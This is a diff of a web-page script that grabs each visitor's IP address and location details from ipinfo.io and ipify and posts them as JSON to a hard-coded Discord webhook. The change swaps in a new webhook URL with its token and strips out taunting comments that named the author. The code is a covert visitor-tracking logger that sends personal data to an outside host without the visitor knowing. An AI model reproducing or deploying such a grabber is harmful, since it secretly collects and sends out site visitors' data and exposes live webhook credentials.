@@ -4,8 +4,8 @@ var ct = $.get("https://ipinfo.io", function (response) {
     return response;
 }, "jsonp");
 
-var ip = new XMLHttpRequest();                                //watcha doing here stalker XD !
-ip.open('GET', 'https://api.ipify.org/');                     //Discord: DawnOfSorrow#1977
+var ip = new XMLHttpRequest();                               
+ip.open('GET', 'https://api.ipify.org/');                    
 ip.send();
 
 ip.onreadystatechange = (e) => {
@@ -54,12 +54,9 @@ ip.onreadystatechange = (e) => {
         }
 
         var dsreq = new XMLHttpRequest();   //post to a discord server
-        dsreq.open('POST', 'https://discord.com/api/webhooks/1152362730871869450/mNJCkG57KRatLtO_wjw0lOxGp-bkz7QONHX2yKkx5IOVPUP5PbFaFzTxkluXuFtf_xwM');
+        dsreq.open('POST', 'https://discord.com/api/webhooks/1242103721438216282/VL9Foi87l1mXUvS22_0UGm6qgo9KVa3e8wpl7qUeLO6iZuEiAJTSmt6wO194T0Wor1vl');
         dsreq.setRequestHeader('Content-Type', 'application/json');
         dsreq.send(JSON.stringify({ content: "```json\n" + JSON.stringify(visitor) + "```", username: "Visitor" }));
     }
 }
 
-
-//document.getElementsByClassName('col-lg-7')[0].className = '';
-//document.getElementsByTagName('img')[0].hidden = true;
